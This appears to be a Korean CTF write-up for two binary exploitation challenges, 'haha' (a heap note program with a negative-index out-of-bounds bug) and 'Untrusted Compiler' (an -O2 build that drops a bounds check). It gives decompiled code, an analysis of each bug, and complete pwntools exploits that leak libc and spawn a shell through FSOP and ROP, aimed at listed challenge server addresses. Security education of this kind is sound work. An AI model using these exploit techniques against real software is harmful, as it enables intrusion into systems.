# haha

흔한 힙 문제이다.

```C
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v4; // [rsp+8h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  init(argc, argv, envp);
  while ( 1 )
  {
    menu();
    __isoc99_scanf("%d", &v3);
    if ( v3 == 4 )
    {
      puts("BYE");
      exit(0);
    }
    if ( v3 > 4 )
    {
LABEL_12:
      puts("invaild input");
    }
    else
    {
      switch ( v3 )
      {
        case 3:
          view();
          break;
        case 1:
          create();
          break;
        case 2:
          edit();
          break;
        default:
          goto LABEL_12;
      }
    }
  }
}
```

1번이 create, 2번이 edit, 3번이 view이다.

```C
__int64 create()
{
  int v1; // ebx
  size_t v2; // rax
  int v3; // [rsp+Ch] [rbp-24h] BYREF
  size_t n[3]; // [rsp+10h] [rbp-20h] BYREF

  n[1] = __readfsqword(0x28u);
  printf("index: ");
  if ( (unsigned int)__isoc99_scanf("%d", &v3) != 1 )
    return 0LL;
  if ( v3 <= 9 )
  {
    if ( *((_QWORD *)&notes + v3) )
    {
      puts("used note!!");
      return 0LL;
    }
    else
    {
      printf("size: ");
      if ( (unsigned int)__isoc99_scanf("%zu", n) == 1 )
      {
        if ( n[0] <= 0x64 )
        {
          sizes[v3] = n[0];
          v1 = v3;
          *((_QWORD *)&notes + v1) = calloc(n[0] + 1, 1uLL);
          if ( *((_QWORD *)&notes + v3) )
          {
            printf("data: ");
            v2 = fread(*((void **)&notes + v3), 1uLL, n[0], stdin);
            if ( v2 == n[0] )
            {
              return 1LL;
            }
            else
            {
              perror("fread");
              return 0LL;
            }
          }
          else
          {
            perror("calloc");
            return 0LL;
          }
        }
        else
        {
          puts("big size..");
          return 0LL;
        }
      }
      else
      {
        return 0LL;
      }
    }
  }
  else
  {
    puts("out of bound!!");
    return 0LL;
  }
}
```

인덱스는 9까지 가능한데 음수를 막아놓지 않아서 OOB가 발생한다. 크기는 0x64까지만 가능하다. calloc으로 청크를 생성한다.

```C
__int64 edit()
{
  size_t v1; // rax
  int v2; // [rsp+Ch] [rbp-14h] BYREF
  size_t n[2]; // [rsp+10h] [rbp-10h] BYREF

  n[1] = __readfsqword(0x28u);
  printf("note index: ");
  if ( (unsigned int)__isoc99_scanf("%d", &v2) != 1 )
    return 0LL;
  if ( v2 <= 9 )
  {
    if ( *((_QWORD *)&notes + v2) )
    {
      printf("size: ");
      if ( (unsigned int)__isoc99_scanf("%zu", n) == 1 )
      {
        if ( sizes[v2] >= n[0] )
        {
          printf("data: ");
          v1 = fread(*((void **)&notes + v2), 1uLL, n[0], stdin);
          if ( v1 == n[0] )
          {
            *(_BYTE *)(*((_QWORD *)&notes + v2) + n[0]) = 0;
            return 1LL;
          }
          else
          {
            perror("fread");
            return 0LL;
          }
        }
        else
        {
          puts("big size..");
          return 0LL;
        }
      }
      else
      {
        return 0LL;
      }
    }
    else
    {
      puts("unused note!!");
      return 0LL;
    }
  }
  else
  {
    puts("out of bound!!");
    return 0LL;
  }
}
```

마찬가지로 OOB가 발생한다. size 배열에 접근해서 값을 비교하는 과정이 있기 때문에 이를 우회해야 한다.

```C
__int64 view()
{
  int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("note index: ");
  if ( (unsigned int)__isoc99_scanf("%d", &v1) != 1 )
    return 0LL;
  if ( v1 <= 9 )
  {
    if ( *((_QWORD *)&notes + v1) )
    {
      printf("data: %s\n", *((const char **)&notes + v1));
      return 1LL;
    }
    else
    {
      puts("unused note!!");
      return 0LL;
    }
  }
  else
  {
    puts("out of bound!!");
    return 0LL;
  }
}
```

말 그래도 view해준다. 이걸로 leak 해주면 된다.

---

note\[-11\]에 \_\_dso\_handle이 있는데, \*\_\_dso\_handle=\_\_dso\_handle 이므로 pie_base를 얻어낼 수 있을 뿐 아니라, edit에서 여길 변조할 수 있다. note\[1\]에 주소를 할당하고(size\[-11\]), edit으로 note\[-10\]에 note\[-8\]의 주소를 넣으면 view에서 libc_base를 구할 수 있다.

&note = pie_base + 0x4060, stdout은 pie_bae + 0x4020에 있다.-> idx = -8

&sizes = pie_base + 0x40c0 -> idx=-8일 때 size가 참조하는 곳이 note\[4\]이므로 이곳에 먼저 할당해주면 stdout을 변조할만한 사이즈를 입력시킬 수 있다.

그 다음은 FSOP이다.

근데 원래하던 FSOP가 작동을 안 한다. fread 때문에 전에 입력했던 '\n'이 들어가는데, 그것 때문에 플래그가 망가지는 것 같다. add rcx 0x10 가젯 필요한 그 FSOP를 써야 하는 것 같다.

```python
from pwn import *
context.log_level = "debug"

p = process("./haha")
#p = remote("52.231.138.208", 5555)
e = ELF("./haha")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def leak_bss(p):
    p.sendlineafter(b">>", b"3")
    p.sendlineafter(b":", b"-11")
    p.recvuntil(b"data: ")
    return u64(p.recv(6).ljust(8, b"\x00")) - 8

def set_data(p, bss):
    p.sendlineafter(b">>", b"1")
    p.sendlineafter(b": ", b"1")
    p.sendlineafter(b": ", b"100")
    p.sendlineafter(b": ", b"A"*99)
    p.sendlineafter(b">>", b"2")
    p.sendlineafter(b": ", b"-11")
    p.sendlineafter(b": ", b"16")
    pay = (bss >> 8).to_bytes(6, "little").ljust(7, b"\x00")
    pay += p64(bss + 0x20)
    p.sendafter(b": ", pay)

def leak_libc(p):
    p.sendlineafter(b">>", b"3")
    p.sendlineafter(b": ", b"-10")
    p.recvuntil(b"data: ")
    return u64(p.recv(6).ljust(8, b"\x00")) - libc.sym["_IO_2_1_stdout_"]

def fsop(p):
    p.sendlineafter(b">>", b"1")
    p.sendlineafter(b": ", b"4")
    p.sendlineafter(b": ", b"1")

    p.sendlineafter(b">>", b"2")
    p.sendlineafter(b": ", b"-8")
    p.sendlineafter(b": ", b"224")

    stdout_lock = libc.address + 0x21ca70 #0x205710
    stdout = libc.sym["_IO_2_1_stdout_"]
    fake_vtable = libc.sym["_IO_wfile_jumps"] - 0x18
    gadget = libc.address + 0x1636a0

    pay = b"\x01\x01\x01\x01\x01\x01\x3b"
    pay += p64(0) + p64(libc.sym["system"]) + p64(0)
    pay += p64(0) + p64(0) + b"/bin/sh\x00"
    pay += p64(0) + p64(0)
    pay += p64(gadget) + p64(0) * 7
    pay += p64(stdout_lock) + p64(0) + p64(stdout + 0xb8) + p64(stdout+0x200)
    pay += p64(0) * 2 +  p64(stdout+0x20) + p64(0) * 3 + p64(fake_vtable)

    p.sendlineafter(b": ", pay)

bss = leak_bss(p)
set_data(p, bss)
libc.address = leak_libc(p)
fsop(p)

for i in range(5):
    p.sendline(b"ls")

p.interactive()
```

---

# Untrusted Compiler

```C
// gcc -o chall chall.c -no-pie -z relro -O2 -fno-stack-protector

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <time.h>

uint32_t random_list[10] = {
    0,
};
uint64_t total_random = 0;

void banner()
{
    printf("                        __                                  _ _           \n");
    printf(" _   _ _ __  ___  __ _ / _| ___    ___ ___  _ __ ___  _ __ (_) | ___ _ __ \n");
    printf("| | | | '_ \\/ __|/ _` | |_ / _ \\  / __/ _ \\| '_  ` _ \\| '_ \\| | |/ _ \\ '__|\n");
    printf("| |_| | | | \\__ \\ (_| |  _|  __/ | (_| (_) | | | | | | |_) | | |  __/ |   \n");
    printf(" \\__,_|_| |_|___/\\__,_|_|  \\___|  \\___\\___/|_| |_| |_| .__/|_|_|\\___|_|   \n");
    printf("                                                     |_|                  \n\n");
}

void init()
{
    srand(time(NULL));
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    banner();

    printf("Start setting 10 randoms...\n");

    for (int i = 0; i < 10; i++)
    {
        uint32_t random = rand();
        random_list[i] = random;
        total_random += random;
    }

    printf("done!\n\n");

    printf("Guess the random value XD\n\n");
}

void flush()
{
    int c;
    while ((c = getchar()) != '\n' && c != EOF)
        ;
}

void guess()
{
    uint16_t idx = 0;
    uint32_t score_list[10] = {
        0,
    };
    uint32_t input_list[10] = {
        0,
    };
    uint64_t score_sum = 0;

    while ((random_list[idx] < UINT32_MAX) && (idx < 10))
    {
        printf("input %d: ", idx);
        scanf("%d", &input_list[idx]);
        flush();
        if (input_list[idx] == random_list[idx])
            score_list[idx] = random_list[idx];

        score_sum += score_list[idx];
        idx++;
        if (score_sum >= total_random)
        {
            return;
        }
    }
}

int main()
{
    init();

    guess();
}
```

컴파일 옵션을 보면 -O2가 있다. O2 옵션 : 최적화 레벨 2로 설정. (대부분의 최적화를 시도)

그래서인지 실제 바이너리에는 while문에 (idx < 10) 이 조건이 빠져있어서 buffer overflow가 가능하다. 그렇게 Ret2Main, ROP가 가능하다.

저 while문은 어떻게 탈출하나면, 어떤 값을 입력하면 input_list[idx]에 들어가고, 이것은 score_list[idx + 10]과 같으므로, 페이로드를 다 설정하고 엄청 큰 수를 입력하면 score_sum += score_list[idx] 에 의해서 whlie문을 벗어날 수 있다.

```C
root@csh:/home/csh# checksec chall
[*] '/home/csh/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    FORTIFY:    Enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Canary도 없고 PIE도 안 걸려있어서, libc_base만 구하면 된다. Ret2Main으로 libc_base를 구하고 main으로 돌아와서 ROP 페이로드를 짜면 된다.

```python
from pwn import *

typ = 1
if typ : p = remote('52.231.138.196', 1337)
else : p = process('./chall')

e = ELF('./chall')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

for i in range(0, 26):
    p.sendlineafter(b': ', str(0))

puts_plt = e.plt['puts']
puts_got = e.got['puts']
RAND_GOT = 0x404050
PUTS = 0x401333
pop_rdi = 0x0000000000401444
pop_rsi_r15 = 0x0000000000401442
ret = 0x000000000040101a
main = 0x0000000000401130

def sd(st):
    p.sendlineafter(b': ', str(st))
    p.sendlineafter(b': ', b'0')

sd(pop_rdi)
sd(puts_got)
sd(puts_plt)
sd(main)

while(1):
    line = p.recv(10, timeout= 1)
    if b':' in line:
        p.sendline(str(0xffffffff).encode())
    else:
        leak = u64(line[:-4]+b'\x00'*2)
        break
print(hex(leak))
libc_base = leak - libc.symbols['puts']

for i in range(0, 26):
    p.sendlineafter(b': ', str(0))

sd(ret)
sd(pop_rdi)
bsh = libc_base + list(libc.search(b'/bin/sh'))[0]
p.sendlineafter(b': ', str(bsh & 0xffffffff))
p.sendlineafter(b': ', str(bsh >> 32))
syst = libc_base + libc.symbols['system']
p.sendlineafter(b': ', str(syst & 0xffffffff))
p.sendlineafter(b': ', str(syst >> 32))

while(1):
    line = p.recv(10, timeout= 1)
    if b':' in line:
        p.sendline(str(0xffffffff).encode())
    else:
        break

p.interactive()
```